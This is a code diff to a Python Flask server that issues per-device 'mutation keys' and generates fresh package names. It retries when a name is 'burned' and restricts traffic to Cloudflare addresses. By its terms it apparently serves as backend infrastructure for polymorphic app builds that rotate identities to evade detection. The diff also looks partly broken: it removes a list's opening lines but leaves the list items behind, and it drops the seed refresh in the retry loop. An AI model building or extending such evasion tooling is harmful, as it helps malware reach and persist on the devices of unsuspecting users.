@@ -13,6 +13,9 @@ Port: 8443 (Cloudflare HTTPS-compatible port)
 """
 
 import os, sqlite3, hashlib, hmac, json, random, string, time, threading
+import sys
+sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'scripts'))
+from package_name_generator import generate_companion_pkg
 import logging
 from datetime import datetime, timezone
 from flask import Flask, request, jsonify, abort
@@ -34,12 +37,6 @@ CLOUDFLARE_IPS = [
     "104.24.0.0/14","172.64.0.0/13","131.0.72.0/22",
 ]
 
-# Package name pools for mutation seed generation
-PKG_PREFIXES = [
-    "com","net","org","io","app","dev","in","co"
-]
-PKG_WORDS = [
-    "sync","data","cloud","media","update","service","core","base",
     "util","helper","manager","bridge","worker","agent","connect",
     "stream","cache","store","push","notify","track","secure","auth",
     "info","user","device","session","config","system","network",
@@ -146,14 +143,6 @@ def get_client_ip():
     if cf_ip:
         return cf_ip
     return request.remote_addr
-
-def generate_pkg_name(seed: str) -> str:
-    """Generate unique package name from seed."""
-    random.seed(seed)
-    prefix = random.choice(PKG_PREFIXES)
-    w1 = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4,8)))
-    w2 = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4,8)))
-    return f"{prefix}.{w1}.{w2}"
 
 def generate_mutation_seed(device_fingerprint: str, client_token: str) -> str:
     """Generate unique mutation seed from device fingerprint + server secret."""
@@ -302,11 +291,10 @@ def get_mutation_key(token):
 
         # Generate unique package name — check not burned
         attempts = 0
-        pkg_name = generate_pkg_name(seed)
+        pkg_name = generate_companion_pkg()
         while check_burned(pkg_name) and attempts < 10:
-            seed = generate_mutation_seed(device_fp + str(attempts), token)
-            pkg_name = generate_pkg_name(seed)
             attempts += 1
+            pkg_name = generate_companion_pkg()
 
         # Select M4 path mutation
         random.seed(seed)
